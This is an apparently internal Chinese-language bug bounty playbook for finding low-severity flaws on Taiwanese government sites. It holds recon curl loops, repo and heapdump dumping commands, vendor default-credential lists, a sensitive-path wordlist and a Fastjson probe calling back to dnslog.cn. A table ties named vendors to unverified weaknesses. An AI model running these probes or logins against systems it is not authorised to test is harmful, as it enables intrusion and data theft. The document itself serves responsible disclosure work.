---
type: wiki
category: playbook
status: active
last-updated: 2026-04-21
---

# 政府站 / 低風險獎金 Quick Wins

> 適用：台灣政府案（HITCON ZeroDay / TWCERT / 各部會漏洞通報）、以及所有 **低嚴重度也有獎金** 的活動。

## 為什麼政府站有肥肉？

1. **委外生態** — 同一套 CMS/後台裝在 50 個部會 = 一個洞全中
2. **舊系統** — ASP/JSP/PHP 5.x 常見，WebLogic 10g、IIS 6 都還在跑
3. **開發習慣** — 常把 `.bak`、`.old`、`backup.zip` 直接丟到 web root
4. **憑證共用** — 廠商喜歡用 `admin/admin`、`admin/12345`、`廠商名+年份`
5. **審核門檻低** — HITCON / TWCERT 對「低風險但真實可重現」都接受

## 一、Top 10 Quick Wins（按 ROI 排序）

| # | 類型 | 工具 | 檢測時間 | 大約獎金（台幣） |
|---|------|------|---------|-----------------|
| 1 | **`.git/` 洩漏** | `hunt-git-exposure` + git-dumper | 5 min | HITCON：CVE、~1000-5000 |
| 2 | **`.env` / config 洩漏** | `hunt-config-leak` | 1 min | HITCON ~1000-3000 |
| 3 | **phpinfo / WEB-INF 暴露** | `hunt-config-leak` | 1 min | HITCON ~500-2000 |
| 4 | **預設帳密** (admin/admin) | `hunt-weak-login` | 3 min | HITCON：依後台權限 ~2000-10000 |
| 5 | **備份檔暴露** (backup.zip) | `hunt-backup-files` | 5 min | HITCON ~2000-5000 |
| 6 | **Swagger / API docs 暴露** | `hunt-config-leak` | 1 min | HITCON ~500-1500 |
| 7 | **Spring Boot Actuator 暴露** | `hunt-actuator-deep` | 3 min | HITCON ~2000-5000 |
| 8 | **Google Maps API key unrestricted** | `hunt-google-api-key` | 5 min | HITCON ~500-2000 |
| 9 | **已知 CVE**（Struts2/Fastjson/Shiro） | `hunt-weak-login` + nuclei | 10 min | 中高 ~5000-30000 |
| 10 | **目錄遍歷** (`../` / Index of) | `hunt-backup-files` | 3 min | HITCON ~1000-3000 |

## 二、逐項操作手冊

### Quick Win #1：`.git/` 洩漏

```bash
# 一鍵
bbflow hunt target.gov.tw --only git-exposure

# 或手動
for path in / /git /repo /src /static; do
  curl -s "https://target.gov.tw${path}/.git/HEAD" | grep "^ref:"
done

# 找到後，還原完整 repo
git-dumper https://target.gov.tw/.git/ ./dump/
cd dump
git log --all --full-history -- "*password*" "*.env" "*.sql"
git show <commit>:config/database.yml
```

**報告重點：**
- 附上 `.git/config` 的 content（遮掉敏感 URL）
- 列出能還原的 commit 數（`git log --oneline | wc -l`）
- 若歷史有 credential → 加一分（highlight P2/P3）

### Quick Win #2：`.env` / config 洩漏

```bash
bbflow hunt target.gov.tw --only config-leak

# FAST=1 只跑 P1/P2 路徑（24 個，全部 < 30 秒）
FAST=1 tools/hunters/hunt-config-leak.sh https://target.gov.tw
```

常中的路徑：
- `/.env` — Laravel / Django / 各種新框架
- `/config.php.bak` — 舊 PHP 系統
- `/appsettings.json` — .NET Core
- `/application.yml`, `/application.properties` — Spring Boot
- `/WEB-INF/web.xml` — J2EE webapp 洩漏

**報告重點：**
- 只要能證明檔案可下載 + 含有敏感欄位（DB_PASSWORD、APP_KEY、JWT_SECRET）
- 不要誇大為 RCE，除非你真的用那個憑證登入了

### Quick Win #3：phpinfo / WEB-INF 暴露

```bash
bbflow hunt target.gov.tw --only config-leak

# 只看 phpinfo 相關
grep -E "phpinfo|WEB-INF|server-status" research/target.gov.tw/hunters/config-leak/*.txt
```

常見檔名：
- `/phpinfo.php`, `/info.php`, `/test.php`, `/debug.php`
- `/WEB-INF/web.xml`, `/WEB-INF/classes/`
- `/server-status`, `/server-info` (Apache mod_status)

**報告重點：** 這類通常是 P4 Info，但政府案通常會給小額獎金。

### Quick Win #4：預設帳密

```bash
bbflow hunt target.gov.tw --only weak-login

# 只跑安全模式（不會誤傷）
SAFE=1 tools/hunters/hunt-weak-login.sh https://target.gov.tw
```

檢測的 vendor：
- Nacos (nacos/nacos)
- Druid (admin/admin)
- Grafana (admin/admin)
- Jenkins (admin/admin)
- phpMyAdmin (root / root:root)
- Tomcat Manager (tomcat/tomcat)
- Solr (solr/SolrRocks)
- Zabbix (Admin/zabbix)
- RabbitMQ (guest/guest)

**報告重點：**
- 必須證明能登入（附截圖 or 登入後的 API response）
- 說明登入後能做什麼（讀 / 改 / 執行）
- 政府案若找到 Jenkins admin access → 可能是 P1 RCE

### Quick Win #5：備份檔暴露

```bash
bbflow hunt target.gov.tw --only backup-files

# 附加候選名稱（知道目標公司/機關名稱時）
tools/hunters/hunt-backup-files.sh https://target.gov.tw 機關英文名 機關簡稱
```

常中的檔名（按命中率排序）：
1. `/backup.zip`, `/www.zip`, `/wwwroot.zip`
2. `/site.zip`, `/web.zip`
3. `/db.sql`, `/dump.sql`, `/database.sql`
4. `/{target}.zip` — 目標名
5. `/backup/`, `/uploads/` — directory listing

**報告重點：**
- 附上 `curl -I` 輸出證明 content-type / size
- 不需要下載整包，擷取前 256 bytes 的 magic number 即可證明

### Quick Win #6：Swagger / API docs 暴露

```bash
bbflow hunt target.gov.tw --only config-leak

# 手動
for p in /swagger-ui.html /swagger/index.html /v2/api-docs /v3/api-docs /openapi.json /api-docs; do
  curl -sI "https://target.gov.tw${p}" | head -1
done
```

**報告重點：**
- Swagger 本身 P4-P5，但 Swagger 裡面的 endpoint 可能有 IDOR / auth bypass
- 找到 Swagger 後：往裡面看哪個 endpoint 沒要 auth

### Quick Win #7：Spring Boot Actuator 暴露

```bash
bbflow hunt target.gov.tw --only actuator-deep

# 手動抽 env
curl -s "https://target/actuator/env" | python3 -m json.tool | grep -iE "password|secret|key"
curl -s "https://target/actuator/heapdump" > heap.bin
# 分析：jhat heap.bin 或 jvisualvm heap.bin
```

**報告重點：**
- `/actuator/env` 洩漏 application.yml 的 property → 含 DB_PASSWORD 就 P2
- `/actuator/heapdump` 洩漏運行時記憶體 → 有時會夾 session token / secret

### Quick Win #8：Google Maps API key

```bash
# 先從 envdata / sourcemap / js-secrets hunter 找到 AIza* key
bbflow hunt target.gov.tw --only envdata,sourcemap,js-secrets

# 找到後驗證 unrestricted
tools/hunters/hunt-google-api-key.sh AIzaSy...XXX
```

**報告重點：**
- 必須證明 key 是 unrestricted（能呼叫付費 API）
- 估算財務影響：Static Maps $2/1000 req × 每日滿額使用
- 這類通常 P3-P4（2026 H1 趨勢是 P4 居多）

### Quick Win #9：已知 CVE（Struts2/Fastjson/Shiro）

```bash
# nuclei 官方 templates
bbflow hunt target.gov.tw --only nuclei

# 手動找 Shiro（rememberMe cookie）
curl -sI https://target.gov.tw/ | grep -i "Set-Cookie" | grep -i rememberMe

# Fastjson 1.2.x 常見：POST body 送 JSON
curl -X POST https://target/api/xxx \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.net.Inet4Address","val":"dnslog.cn"}'
```

**報告重點：**
- 政府案若中 Shiro 反序列化 → P1 RCE，獎金可能 > NT$30k
- 必須 PoC 能真的執行命令（搭配 dnslog.cn / Burp Collaborator）

### Quick Win #10：目錄遍歷 / Index of

```bash
bbflow hunt target.gov.tw --only backup-files
# 會自動檢查 /backup/ /uploads/ /files/ 等 16 個常見目錄

# 手動
for d in /backup/ /backups/ /bak/ /db/ /upload/ /uploads/ /files/ /old/ /temp/ /tmp/; do
  curl -s "https://target.gov.tw${d}" | grep -oE "<title>Index of[^<]*"
done
```

**報告重點：**
- `Index of /xxx/` 本身只算 P5 Info
- 但目錄內容有真的敏感檔案（.env、.sql、.zip）→ 升級
- 用 `wget -r` 抓下來前先用 `curl -s | grep href` 看檔案清單

## 三、政府案專用 payload 字典

把這些加進 ffuf wordlist（`tools/payloads/gov-paths.txt`）：

```
phpinfo.php
info.php
test.php
debug.php
admin.php
admin.aspx
login.aspx
config.php.bak
config.php~
config.old
web.config
.env
.env.local
.env.production
backup.zip
www.zip
wwwroot.zip
site.zip
db.sql
database.sql
.git/config
.svn/entries
.DS_Store
WEB-INF/web.xml
WEB-INF/classes/
server-status
server-info
druid/index.html
nacos/
actuator/env
actuator/heapdump
swagger-ui.html
v2/api-docs
```

## 四、台灣政府案常見廠商 + 已知弱點

| 廠商 | 常見標的 | 常見弱點 |
|------|---------|---------|
| 叡揚資訊 | 中央部會、健保署 | Vital 系列 CMS 預設帳密、.svn 洩漏 |
| 凌網科技 | 教育部、各大學 | HyLib、HyRead 系列 IDOR、Swagger 暴露 |
| 中華系統整合 | 經濟部、財政部 | 老舊 ASP 系統、SQL injection |
| 華苓科技 | BPM / Workflow | 舊 JSP、.git 洩漏 |
| 安碁資訊 | 金控、大型企業 | 資安廠商反而常見 JS source map 洩漏 |
| 中華電信 HiNet | 全民標的 | 單一登入 SSO 漏洞 |
| 雲端沃客 / Ragic | 資料庫雲服務 | API key 暴露、訂單 IDOR |

## 五、送件注意事項

### HITCON ZeroDay

- **必須用 `{}` 隱藏機關名**：`{經濟部} 漏洞名稱`
- **類型選對**（見 CLAUDE.md 表格）— 選錯會自動建議高 severity 被打臉
- **完整 PoC** — curl 指令、HTTP response、影響說明
- **截圖** — `{{IMG#1}}` 引用方式
- **低風險也能送** — 只要真實可重現

### TWCERT

- 適合 **CVE 類型**（有可分配 CVE 編號的漏洞）
- 韌體漏洞首選
- 網站漏洞走 HITCON 較好

### 政府特定公布

- 金管會、國發會偶爾有專案
- 獎金較高但 scope 窄

## 六、送件前最後檢查

- [ ] PoC 用 curl 獨立重現過（不靠 Burp session）
- [ ] 漏洞類型分類精準（source map 不要歸 "Disclosure of Secrets"）
- [ ] Severity 符合實際（不誇大為 RCE）
- [ ] 對照 HITCON 已公開報告查重
- [ ] 截圖 + 敘述 + 重現步驟三合一

## 關聯文件

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md)
- [10-hunter-config-leak.md](10-hunter-config-leak.md)
- [11-hunter-weak-login.md](11-hunter-weak-login.md)
- [12-hunter-backup-files.md](12-hunter-backup-files.md)
- [Skill - report-writing.md](../Skill%20-%20report-writing.md)
